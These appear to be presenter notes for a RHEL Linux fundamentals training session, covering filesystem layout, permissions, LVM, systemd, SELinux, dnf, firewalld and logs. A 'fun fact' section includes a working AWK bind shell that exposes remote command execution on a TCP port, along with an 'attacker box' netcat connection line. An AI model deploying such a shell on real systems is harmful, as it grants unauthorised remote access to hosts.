	**"You don‚Äôt need to be a sysadmin, but you do need to know your way around a Linux box. That‚Äôs what this session is for."**
	
	  
	
## **1.1 üéØ Purpose of the Session (1‚Äì2 min)
	
	  
	
		‚ÄúToday we‚Äôre building practical Linux fluency‚Äîfocused on RHEL-based enterprise systems, like what you see in prod VMs, development environments, and automation pipelines.‚Äù
		
		  
		
		This session is for:
		
		  
		
		- Developers, analysts, and engineers who touch Linux occasionally. ( have just enought sillyness in you to wanna play around)
		
		  
		
		- Admins new to RHEL or those who want a firmer foundation
		
		  
		
		- People who‚Äôve broken stuff on Linux before and want to understand why üòÖ
		
		  
		
		- Anyone who‚Äôs ever typed sudo and prayed
		
		  
		
		Goal:
		
		You‚Äôll leave with a real mental model of how Linux works, what‚Äôs where, why things break, and how to investigate confidently without making things worse.
		
	  

##1.2 üö´ What This Session Isn‚Äôt (1 min)
	  
	
	‚ùå Not distro-hopping: this is RHEL/CentOS/Rocky-focused
	
	(Yes, Ubuntu has apt, yes it has /etc, but the default layout, firewalld, SELinux, LVM, etc. are RHEL-native and that‚Äôs what matters here. We are here to build stuff that secretly runs the world and silently code daemons from the shadows)
	
	  
	
	‚ùå Not DevOps: we‚Äôre not covering container orchestration, Ansible playbooks, or CI/CD pipelines today.
	
	  
	
	‚ÄúThis is the bare metal, SSH-in-and-fix-it side of Linux.‚Äù
	
	  
	
	‚ùå Not kernel-deep: no kernel module writing, stack traces, or hardware driver hell.
	
	  
	
	This session is designed to support real-world troubleshooting, daily system navigation, and communications accross teams.
	
	  
	
## 1.3 üõ°Ô∏è Safe Participation Tips (1 min)
	
	  
	
	You‚Äôre welcome to follow along on your own VM or lab box, but:
	
	  
	
	Use a non-prod, non-critical system (e.g., a Rocky Linux VM, RHEL trial VM, or a cloud sandbox)
	
	  
	
	**‚ÄúYou‚Äôll get more out of this if you take notes, ask questions, and try the commands on your own later‚Äîideally on a VM you can break and restore. I have NO EGO, NO PRIDE AND I love questions‚Äù**
	
	  
	
	##1.4 üì¨ Optional Housekeeping (0.5‚Äì1 min)
	
	  
	
	Slides/recording will be available afterward
	
	  
	
	Cheat sheet and GitHub repo/Markdown notes available
	
	  


# **üìÅ 2. Filesystem Structure (10‚Äì12 min)**

  ![[Pasted image 20250520190548.png]]

**"Where everything lives, why it lives there, and how Red Hat organizes it for scale and control"**

  

üß± 2.1. The Philosophy

  

	Linux follows the FHS (Filesystem Hierarchy Standard): everything is either a file or a process.
	
	  
	
	Unlike Windows, no separate C:\ drive‚Äîjust one unified tree starting at / (root).
	
	  
	
	It‚Äôs modular and composable: you can mount any device anywhere.
	
	  
	
	Enterprise distros like RHEL separate concerns for automation, backups, and scaling.

  

üìÇ 2.2. Critical Directories You Must Know

	Directory Purpose
	
		/etc Config files for everything on the system (no binaries!)
		
		/var Variable data: logs, mail, spool files. Grows fast.
		
		/home User directories. Usually on a separate logical volume or NFS.
		
		/usr Read-only OS software, shared libraries, utilities
		
		/opt Third-party apps (e.g., Oracle, backup agents)
		
		/tmp Temporary files. Cleared on reboot. Watch for disk abuse here.
		
		/dev Pseudo-devices. ls /dev/sd* shows block devices like drives
		
		/proc Virtual filesystem. Kernel exposes runtime info here (cat /proc/cpuinfo)

  ## 3.1 ls -la Output Breakdown

When you run:

```bash
ls -la
```
You'll see something like:
```
-rw-r--r--  1 john  devs   4096 May 20 12:00 example.txt
```


What each column means:

| What         | What it means                                                                                                                                                    |     |

2.3 File Types and Permission Bits
The first 10 characters of the line represent the file type and access permissions.

-rw-r--r--

This breaks down into:

[TYPE][User][Group][Other]

    Position 1 (File type):

        - ‚Üí regular file

        d ‚Üí directory

        l ‚Üí symbolic link

        c, b ‚Üí special device files

    Positions 2‚Äì4 (User permissions)

    Positions 5‚Äì7 (Group permissions)

    Positions 8‚Äì10 (Other/world permissions)

Each set uses:

    r = read

    w = write

    x = execute

    - = no permission

Common Examples
	Permission	Meaning
	-rw-r--r--	Owner can read/write, group can read, others can read
	-rwxr-xr--	Owner: all, group: read/execute, others: read
	drwxr-xr-x	Directory with full access for owner, read/execute for others

2.4 Users and Groups

Each file belongs to:

    A user (the owner)

    A group (a collection of users)

Check your identity:

	whoami
	groups

Change ownership:

	chown username:groupname filename
	
	Example:
	
	chown alice:devs script.sh
	
	3.4 Modifying Permissions with chmod
	Symbolic Mode:
	
	chmod u+x script.sh      # Add execute to the user
	chmod g-w file.txt       # Remove write from group
	chmod o+r file.txt       # Add read for others

	Octal Mode:

	Each permission bit has a numeric value:
	Permission	Binary	Value
	r	100	4
	w	010	2
	x	001	1
	
	So:
	Octal	Meaning
	7	rwx
	6	rw-
	5	r-x
	4	r--
	0	---
	
	Examples:
	
	chmod 644 file.txt    # -rw-r--r--
	chmod 755 script.sh   # -rwxr-xr-x
	chmod 700 secrets.txt # -rwx------

2.5 Bonus: Special Bits (Sticky, SUID, SGID)

Sometimes you‚Äôll see extra letters in permission strings, like t or s.
Sticky Bit (t)

    Common on /tmp

    Prevents users from deleting files they don‚Äôt own in world-writable directories

drwxrwxrwt 10 root root 4096 May 20  /tmp

SUID (s on user exec bit)

    Runs the program as the file owner, not the user launching it

SGID (s on group exec bit)

    Runs the program with group privileges or assigns group ownership to new files in a directory

2.6 Real-World Advice

    Avoid 777 unless it‚Äôs /tmp and even then, think twice

    Watch out for world-writable files (-rw-rw-rw-) ‚Äî they are usually bad news

    Use chmod with intention ‚Äî don‚Äôt just copy/paste what StackOverflow says

    "Permissions are not just about access ‚Äî they‚Äôre about boundaries, risk, and control. Don‚Äôt treat them casually."

## üòà Fun Fact: AWK Is Turing Complete; and Slightly Dangerous

AWK isn‚Äôt just for slicing CSVs. It‚Äôs actually **Turing complete**, meaning you could (in theory) write an entire operating system in it. (Please don‚Äôt.)

But just to prove a point, here‚Äôs a **non-interactive bind shell** written entirely in AWK.

### üî• What It Does:
	Binds a TCP port and allows remote command execution over the network.

### üß™ To test it:
On your attacker box:
```bash
nc target.com 12345

- Run `nc target.com 12345` on the attacker box to connect to the shell.
    
    ```

Lil snippet for the target
``` bash
    LPORT=12345
    awk -v LPORT=$LPORT 'BEGIN {
        s = "/inet/tcp/" LPORT "/0/0";
        while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
        while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
    ```

## 3.4 Live Demo Suggestions

Show these **non-destructive, practical one-liners**:

# üì¶ 3. LVM ‚Äì Why It Exists and Where It Shows Up

  

RHEL installs use LVM (Logical Volume Manager) by default.

  

Why? Flexibility. You can resize volumes live, take snapshots, and separate concerns.


The classic layout you‚Äôll see:



LVM hierarchy:
![[Pasted image 20250520171937.png]]
  

Physical Volume (/dev/sda2) 
	‚Üí Volume Group (rhel) 
		‚Üí Logical Volumes (rhel-root, rhel-home, etc)

  

Inspect it:

  

	lsblk
	
	vgs
	
	lvs

  

üß™ 3.4. Safe Demo (Read-Only)

  

SSH into a RHEL box or VM (real or lab), no sudo needed:

  

ls /

  

	- Lists files and directories in the root (/) directory
	
	  
	
	- Fast way to get a feel for the top-level Linux layout
	
	  
	
	- Shows entries like /etc, /var, /home, etc.
	
	  
	
	- Think of it as: ‚ÄúWhat‚Äôs at the very top of the filesystem?‚Äù

  

tree -L 1 /

  

	- Displays the directory tree of /, limited to 1 level deep
	
	  
	
	- Helps visualize folder structure hierarchically
	
	  
	
	- Easier than mentally parsing a long ls output
	
	  
	
	- Use -L 2 or -L 3 to go deeper (but be careful‚Äîthis explodes fast)

  

df -h

  

	- Shows disk space usage per mounted filesystem
	
	  
	
	- -h means human-readable (e.g., shows 10G instead of 10737418240)
	
	  
	
	- Lets you see which mounts (like /, /boot, /home) are filling up

  

	Common flags:

  

		df -T ‚Üí also shows filesystem type (ext4, xfs, etc.)

  


lsblk

  

	- Lists all block devices and how they‚Äôre mounted
	
	  
	
	- Clean visual map of physical disks (/dev/sda) and partitions/LVs
	
	  
	
	- Shows which devices are used for /, /home, etc.
	
	  
	
	- Output includes:
	
	  
	
	- NAME (e.g., sda, sda1)

	Shows Volume Groups in LVM

  

Useful for seeing:

  

VG name (e.g., rhel)

  

Total size, free space, how many LVs/PVs are in the group

  

If you see a VG with lots of free space, you could extend LVs

  

lvs

  

Lists Logical Volumes in LVM

  

Shows:

  

LV names (e.g., rhel-root, rhel-home)

  

Their size and what VG they belong to

  

You can correlate this with lsblk to map which LV is mounted where

  

Show how:

  

/home is a separate LV ‚Üí makes backups easy and damage isolated

  

/var is its own LV ‚Üí so logs or a mail spool can‚Äôt fill root and kill the system

  

Use lsblk to point out the underlying /dev/mapper/rhel- logical volumes*

  

Mention that LVs can span multiple physical drives (unlike partitions)

  
  

üõ†Ô∏è 3.5. Admin Insight Commentary

  

‚ÄúWhen a box is running out of space in /var but has free space in the VG? You can extend it live. Welcome to real Linux.‚Äù

  

‚ÄúEver had an app crash a system by filling /tmp? That‚Äôs why we mount it separately.‚Äù

  

Mention RHEL hardening often mounts dirs like /var/log with noexec or nodev flags
     ### `noexec` and `nodev`
	
	These are **mount flags** you can set in `/etc/fstab` or apply temporarily with `mount -o`, used to restrict what can happen in certain directories.
	
	---
	
### üö´ `noexec` ‚Äî **No Executables Allowed**
	
	- **What it does:**  
	    Prevents executing **binary programs** from the mounted filesystem.
	    
	- **Why it matters:**  
	    Stops attackers from **uploading and executing malicious binaries** in places like `/tmp`, `/var`, or user-mounted USB drives.
	    
	- **Example:**  
	    If `/tmp` is mounted with `noexec`, then running:
### üö´ `nodev` ‚Äî **No Device Files**

- **What it does:**  
    Prevents the creation or usage of **device special files** (like `/dev/sda`, `/dev/null`) in that mount.
    
- **Why it matters:**  
    Stops a non-root user from mounting a filesystem (like a USB drive) and trying to create a fake block device that could let them **bypass controls or read raw disks**.
    
- **Best for:** anything user-accessible ‚Äî `/home`, `/tmp`, `/mnt`, external filesystems

 Chapter 3: File Permissions, Ownership, and RWX in Linux

Understanding Linux file permissions is essential for managing access, securing systems, and troubleshooting weird behavior. This chapter breaks down what you see in `ls -la`, how to interpret permissions, and how to safely modify them.

# ‚öôÔ∏è **4. Init Systems & Services**

_"Who starts your services, keeps them alive, logs their death, and cleans up the mess when they crash? That‚Äôs the init system."_

![[systemd.png]]
# Unlike the Doomslayer, Init systems SPAWN daemons and kills orphans.... 
In any other place, youd probably run from it.
--



üß† Zombie: process with no parent, stuck in process table  
üëª Orphan: lost its parent, reparented to PID 1 (systemd)  
üî• Daemon: long-lived background service

### üß† **What is an Init System?**

- The **init system** is the **first userspace process** started by the kernel (`PID 1`) after boot. (AKA INIT SYSTEMS ARE AWESOME THEY KILL ZOMBIES AND SPAWN DAEMONS!!)
    
- Its job: **start and manage services**, set up your environment, and **keep critical daemons alive**.
    
- It also:
    
    - Spawns and tracks long-lived system processes (daemons)
        
    - **Reaps zombie/orphaned processes**
        
    - Determines **what services start, in what order, and under what conditions**
        

---

### üí• **Why systemd?**

- `systemd` is the default init system in RHEL 7+ (and most modern distros)
    
- Replaced older `SysVinit` and `Upstart`
    
- It‚Äôs fast, parallelized, modular, and deeply integrated into RHEL
    

---

## üõ†Ô∏è **How systemd Works**

### üîó 4.1**1. Units**

- Everything is a **unit** in `systemd`
    
- Units describe **what** to start and **how** to manage it
    
- Types of unit files:
    
    - `.service` ‚Üí system services (e.g., `sshd.service`)
        
    - `.socket` ‚Üí socket activation (e.g., start service when traffic hits a port)
        
    - `.target` ‚Üí logical group of units (like runlevels)
        
    - `.mount` ‚Üí mount points
        
    - `.timer` ‚Üí cron-like scheduled units


Unit files are stored in:
	/usr/lib/systemd/system/      ‚Üê packaged services
	/etc/systemd/system/          ‚Üê local overrides/custom services

### üéØ **4.2. Targets (the new runlevels)**

- A **target** is a named group of units meant to be reached at a system state
    
- Examples:
    
    - `multi-user.target` ‚Üí non-GUI, multi-user mode (like old runlevel 3)
        
    - `graphical.target` ‚Üí boots to GUI (like runlevel 5)
        
    - `rescue.target` ‚Üí single-user repair mode
- ![[Pasted image 20250520181547.png]]


In the server world.. Only muggles use GUIs. Youll probably never see runlevel 5 on a server.

### üîÅ **4.3 Dependencies**

- systemd understands complex **unit relationships**
    
- You can define:
    
    - `Requires=` ‚Üí must also be active
        
    - `After=` ‚Üí must start after another service
        
    - `Wants=` ‚Üí optional dependencies
        
- Example: `nginx.service` might require `network-online.target` before starting

## üöÄ **Practical systemctl Usage (Core Admin Stuff)**

| **Command**                           | **What it does**                             |
| ------------------------------------- | -------------------------------------------- |
| `systemctl status sshd`               | Show current state, recent logs, PID, uptime |
| `systemctl start sshd`                | Start the service now                        |
| `systemctl stop sshd`                 | Stop it now                                  |
| `systemctl enable sshd`               | Start it **on boot**                         |
| `systemctl disable sshd`              | Don‚Äôt start on boot                          |
| `systemctl restart sshd`              | Stop and start                               |
| `systemctl reload sshd`               | Reload config without restart (if supported) |
| `systemctl is-enabled sshd`           | Shows if it starts at boot                   |
## üìú **systemd Unit File Anatomy (for .service files)**

Example: `/usr/lib/systemd/system/httpd.service`
```
[Unit]
Description=Apache Web Server
After=network.target

[Service]
Type=notify
ExecStart=/usr/sbin/httpd -DFOREGROUND
ExecReload=/bin/kill -HUP $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target

```


### üß© Breakdown:

- **[Unit]** ‚Üí metadata and dependencies
    
- **[Service]** ‚Üí how to run, stop, and restart
    
- **[Install]** ‚Üí what target this links to when you `enable` it
    

---

## üìú **journalctl Basics (Log Everything PID 1 Sees)**

- `systemd` **captures logs** from all services using `journald`
    
- Use `journalctl` to view and filter
    

### Core commands:
journalctl -u sshd           # Logs for just sshd
journalctl -xe               # Show recent errors/warnings
journalctl --since today     # Filter by time
journalctl -b -1             # Logs from previous boot


üß™ **Live Demo (Safe, Read-Only)**

	systemctl status sshd
	systemctl is-enabled sshd
	journalctl -u sshd --since today

**Explain:**

- `active (running)` ‚Üí the service is up
    
- `enabled` ‚Üí it‚Äôs set to start at boot
    
- If it failed, `systemctl status` and `journalctl -xe` will show logs and errors


### üß† Admin Real Talk:

- If a service won‚Äôt start, check its unit file and journal logs
    
- If `systemctl says ‚ÄúActive: failed‚Äù`, don‚Äôt just restart it  **figure out why** WHat might you run/do?
    
- **Don‚Äôt edit unit files in `/usr/lib/systemd/`** ‚Äî use overrides in `/etc/systemd/system/` or run `systemctl edit servicename`
- Now.. Would I be sour if you chmod 777 a unit file for the shiny new service you made?



# Chapter 5: SELinux Basics ‚Äì Security That Breaks Everything Until You Learn It

![[Pasted image 20250520191448.png]]

> _"Your config is fine. It‚Äôs just SELinux being SELinux."_  
> ‚Äî Every sysadmin, at least once

---

## üîí 5.1 Why SELinux Exists

- **SELinux** (Security-Enhanced Linux) is a **mandatory access control (MAC)** system built into RHEL.
- It adds **fine-grained security rules** on top of file permissions.
- Think of it as:  
  > ‚ÄúEven if `nginx` has permission to read the file‚Ä¶ **SELinux might still say no** because `nginx` isn't *authorized* to access that type of file.‚Äù

### üß† TL;DR:
> **Discretionary Access Control (DAC)** = file permissions (rw-r--r--)  
> **Mandatory Access Control (MAC)** = SELinux (you must have *label-level* permission too)

---

## üß≠ 5.2 SELinux Modes

```bash
getenforce        # Shows current mode
setenforce 0      # Switch to permissive (temporary, runtime only)

```

| Mode       | Meaning                                                           |
| ---------- | ----------------------------------------------------------------- |
| Enforcing  | SELinux is active and enforcing rules                             |
| Permissive | Logs violations, but does not block (great for testing/debugging) |
| Disabled   | SELinux is completely off (requires reboot and config change)     |


To permanently set the mode, edit:

/etc/selinux/config

## üè∑Ô∏è 5.3 SELinux Contexts

Every file, process, and port has a security context, which looks like:

```
-rw-r--r--. root root system_u:object_r:httpd_sys_content_t:s0 index.html
```


Context breakdown:

| Field  | Description                        |
| ------ | ---------------------------------- |
| user   | SELinux user (usually system_u)    |
| role   | Usually object_r for files         |
| type   | Most important ‚Äî determines access |
| level	 | Usually s0; used in MLS (rare)     |

Useful commands:

ls -Z               # Show SELinux context of files
ps -eZ              # Show context of running processes
semanage fcontext   # Manage default file contexts
restorecon -Rv /dir # Restore default context

üõ†Ô∏è 6.4 Common Troubleshooting Tools

audit2why

Takes log entries from /var/log/audit/audit.log and explains why something was denied.

cat /var/log/audit/audit.log | audit2why

    "Why won‚Äôt Apache read this file? audit2why knows."

restorecon

Restores a file's context to what it should be based on policy.

restorecon -v /var/www/html/index.html

    Great when you copied a file and it magically stopped working? That‚Äôs SELinux context mismatch.

‚ö†Ô∏è 6.5 The Classic Problem

Your config is perfect. Permissions are correct. Firewall is open.
But the service still fails to access a file or bind to a port?

‚úÖ Check SELinux:

	getenforce
	ls -Z file

‚úÖ If in doubt:

	audit2why
	restorecon


	## üõ†Ô∏è Creating and Applying a Custom SELinux Policy Module

Sometimes SELinux blocks legitimate actions your service needs to perform. Instead of disabling SELinux, you can create a **custom policy module** to allow the specific behavior.

### üîç Step 1: Extract Denied Actions from the Audit Log
```bash
grep "avc:  denied" /var/log/audit/audit.log > denied.log
```
üßô Step 2: Generate a Policy Module

```bash
audit2allow -M my_policy < denied.log
```

This creates:

    - my_policy.te ‚Üí human-readable policy source

    - my_policy.pp ‚Üí compiled policy module (binary)

‚úÖ Step 3: Install the Policy Module

 ```bash
 semodule -i my_policy.pp
```

The changes take effect immediately.

‚ö†Ô∏è Pro Tips

    Always read the .te file to make sure you‚Äôre not allowing something risky.

    Often, SELinux denials are caused by mislabeled files ‚Äî fix those with:

restorecon -Rv /path/to/problem

    "SELinux blocks what‚Äôs broken, but also what‚Äôs dangerous. Write custom policies wisely."

üí° Real Talk

    Don‚Äôt just disable SELinux because ‚Äúit‚Äôs annoying‚Äù

    Learn to live with it, or set to permissive while testing
	    1) sudo getenforce
	    2) sudo setenforce 0
	    3) see if it works. If it does check audit2why
	    4) sudo setenforce 1 #Set it back to enforcing
	    5) sudo getenforce

    It actually protects you when something gets compromised

    "SELinux: the thing that broke your config ‚Äî and also stopped a 0-day."


# üì¶ Chapter 6: Package Management ‚Äì Installing Software Like an Admin

> ![[Pasted image 20250520195323.png]]
> 
> _‚ÄúIn Linux, software doesn‚Äôt come from websites ‚Äî it comes from the system itself.‚Äù_

When you need to install software on a Linux server, you don‚Äôt go download an installer  you use a **package manager**. This is cleaner, safer, and much easier to automate. Its like an app store for nerds.

---

## 6.1 RPM vs DEB (Know Your Ecosystem)

There are two major families of Linux package formats:

| Format | Used By                         | Tools                    |
|--------|----------------------------------|---------------------------|
| RPM    | RHEL, CentOS, Rocky, Fedora     | `dnf`, `yum`, `rpm`      |
| DEB    | Debian, Ubuntu                  | `apt`, `dpkg`            |

> Since we‚Äôre focused on **RHEL**, we‚Äôll use `dnf` (or its legacy version `yum`).

---

## 6.2 `dnf` Basics (Dandified Yum)

### üõ†Ô∏è Common Commands

| Command                     | What It Does                          |
|-----------------------------|----------------------------------------|
| `dnf install <pkg>`         | Installs a package                     |
| `dnf remove <pkg>`          | Uninstalls a package                   |
| `dnf update`                | Updates all packages                   |
| `dnf info <pkg>`            | Shows package metadata (safe!)         |
| `dnf search <term>`         | Searches for packages by keyword       |
| `dnf list installed`        | Lists installed packages               |
| `dnf check-update`          | Shows what updates are available       |
| `dnf history`               | Shows your transaction history         |

---

## 6.3 Example: Safe Dry-Run

We don‚Äôt want to install anything during the demo ‚Äî just demonstrate what *would* happen.

```bash
dnf info htop
```

### üîí Bonus: How to Search
``` bash
	dnf search nginx
```



> Useful if you don‚Äôt remember the exact package name. Just grep it.

---

## 6.4 Where Packages Come From

RHEL packages come from **enabled repositories**:

- Defined in: `/etc/yum.repos.d/`
    
- Can include:
    
    - Official Red Hat repos
        
    - EPEL (Extra Packages for Enterprise Linux)
        
    - Internal mirrors or satellite servers
        

You can list them with:
```bash
dnf repolist
```


## 6.5 RPM vs DNF

Under the hood, `dnf` uses **RPM packages**. You can interact directly with them:
rpm -q <pkg>            # Is this package installed?
rpm -ql <pkg>           # What files did it install?
rpm -qi <pkg>           # Package info
rpm -e <pkg>            # Remove (use with care)


But generally, stick to  dnf it handles dependencies, repositories, and transactions better.


## 7.6 Real-World Advice

- Don't just `curl | bash`. Use the package manager.
    
- **Avoid using `--nogpgcheck`** unless you know exactly what you're doing.
    
- Want bleeding-edge software? Look into **EPEL**, **modular streams**, or building your own `.rpm`.

## üß™ Demo Suggestion

Show these in read-only/safe mode:

`dnf info htop`
`dnf search nginx`
`dnf list installed | grep ssh`
`dnf repolist`

‚ÄúDNF doesn‚Äôt just install software; it handles everything that software depends on, secures it, and logs it. Don‚Äôt fight the package manager.‚Äù

# üåê Chapter 8: Networking & Firewalls ‚Äì Know Your Packets

> _"If you can't ping it, you can't debug it."_  
> ‚Äì Every Linux admin ever

Linux gives you powerful low-level tools to manage and troubleshoot networking ‚Äî no GUI needed. This chapter covers IP configuration, DNS lookups, and firewall zones using enterprise-relevant tools.

---

## 9.1 IP Addresses and Interfaces

To check your interfaces and IP addresses:

```bash
ip a
```

You'll see something like

```
:2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.1.50/24 brd 192.168.1.255 scope global dynamic ens192
```


This tells you:

- The interface name (e.g., `ens192`)
    
- IP address and subnet
    
- Whether it's up


## 8.2 DNS and Connectivity Tools

### üîß Command Cheat Sheet

|Command|Purpose|Example|
|---|---|---|
|`dig`|DNS lookup (like nslookup)|`dig google.com`|
|`curl`|HTTP/HTTPS request tester|`curl -I https://example.com`|
|`ss -tuln`|Show open ports and services|`ss -tuln`|

```bash
nmcli connection show
```

This lists all active and inactive connections:

```
NAME      UUID                                  TYPE      DEVICE
Wired     abc123...                             ethernet  ens192
```

Other useful nmcli commands:

```bash
nmcli device status
nmcli con up Wired
```

`nmcli` is great for scripting and automation ‚Äî it's way better than editing `/etc/sysconfig/network-scripts` manually.
If youre in a pinch use nmtui. Its nice and graphical-ish

## 8.4 Firewalld and Zones

**firewalld** manages the firewall in RHEL/CentOS/Rocky ‚Äî it uses **zones** to define trust levels per interface.

### üî• Zones Concept

|Zone|Description|
|---|---|
|`public`|Default zone for general connections|
|`internal`|For trusted LAN devices|
|`dmz`|Isolated zone for exposed services|
|`drop`|Drops all incoming traffic silently|
|`trusted`|Allows all traffic|


üîç Check Current Rules
```bash
firewall-cmd --list-all
```

![[Pasted image 20250520200220.png]]

This shows:

- Default zone
    
- Open ports
    
- Allowed services

üîÅ Reload or Change Rules

```
firewall-cmd --add-port=8080/tcp --permanent
firewall-cmd --reload

```

File based management:

Theres also the defined files at /etc/sysconfig/network-scripts/ifcfg-ifname

example:
![[Pasted image 20250520200544.png]]

üß™ Demo:

```
ip a                         # See IPs and interfaces
nmcli connection show        # List configured network connections
ss -tuln                     # Check for listening services
firewall-cmd --list-all      # Check current firewall rules
dig starbucks.com               # Check DNS
curl -I https://www.army.mil   # See HTTP headers (no body)
```

# ü™µ Chapter 9: Logs & Troubleshooting ‚Äì Reading the Story Your System Is Telling

![[Pasted image 20250520201321.png]]

> _"When something breaks in Linux, the logs know before you do."_

Understanding Linux logging is critical for diagnosing issues quickly ‚Äî especially in production. This chapter focuses on how to **triage problems using logs**, understand the logging system, and apply filters with `journalctl`.

---

## 9.1 How Logging Works in RHEL

RHEL systems use a combination of:

| Component     | Role                                                              |
|---------------|-------------------------------------------------------------------|
| `rsyslog`     | Traditional syslog service ‚Äî routes logs to `/var/log/` files     |
| `systemd-journald` | Captures logs from systemd-managed services into the journal |
| `auditd`      | Captures security-related events (SELinux, sudo, etc.)            |

Logs go to files **and/or** the `systemd` journal, depending on system config.

---

## 9.2 Important Log Files

| File                         | What It's For                                              |
|------------------------------|------------------------------------------------------------|
| `/var/log/messages`         | General system logs (boot, daemons, services)             |
| `/var/log/secure`           | Security events ‚Äî logins, sudo, SSH                       |
| `/var/log/audit/audit.log`  | SELinux denials, system policy events                     |
| `/var/log/cron`             | Cron job activity                                          |
| `/var/log/dnf.log`          | Package management history                                |
| `/var/log/httpd/*`          | Apache logs, if installed                                 |

> üìé `messages` and `secure` are your go-to logs for most system troubleshooting.

---

## 9.3 journalctl ‚Äì Your Log Dashboard

`journalctl` reads from the systemd journal ‚Äî a unified logging system with advanced filters.

### Common Filters:

| Command                                  | Purpose                                 |
|------------------------------------------|-----------------------------------------|
| `journalctl -xe`                         | View recent errors                      |
| `journalctl -u sshd`                     | Logs for a specific service             |
| `journalctl --since today`              | Logs from today                         |
| `journalctl -b -1`                       | Logs from previous boot                 |
| `journalctl -f`                          | Live view of logs (like `tail -f`)      |

---

## 9.4 Troubleshooting Methodology

When something breaks, follow this approach:

### üîç Triage Flow:
1. **Reproduce the issue** (if safe)
2. **Identify the affected service or process**
3. **Check system logs**:
    ```bash
    journalctl -xe
    journalctl -u <service>
    ```
4. **Check traditional logs**:
    ```bash
    less /var/log/messages
    less /var/log/secure
    ```
5. **Look for keywords**:
   - `failed`, `denied`, `segfault`, `timeout`, `unauthorized`, `refused`

---

## üß™ Demo: Trace a Failed SSH Login

1. Attempt an SSH login with incorrect credentials:
    ```bash
    ssh baduser@localhost
    ```

2. Check the logs:
    ```bash
    journalctl -u sshd --since -5m
    ```

3. Or with grep:
    ```bash
    grep sshd /var/log/secure
    ```

You‚Äôll see log entries like:
```
sshd[12345]: Failed password for invalid user baduser from 192.168.1.10 port 52522 ssh2
```

---

## üß† Real-World Advice

- `journalctl` is your first stop for systemd-managed services.
- Combine logs with `grep`, `less`, and `awk` to surgically extract what you need.
- Automate log review with monitoring tools or alerting pipelines (Splunk, ELK, etc).
